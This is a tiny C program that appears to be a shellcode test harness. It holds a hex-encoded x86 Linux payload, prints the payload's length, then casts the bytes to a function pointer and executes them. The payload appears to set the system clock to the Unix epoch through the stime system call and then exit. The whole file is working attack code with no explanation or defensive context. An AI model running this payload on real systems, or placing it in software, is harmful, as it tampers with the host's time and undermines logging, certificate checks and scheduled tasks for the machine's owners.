#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\xb0\x19\x89\xe3\xcd\x80\xb0\x63\x2c\x62\xcd\x80"

;
main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
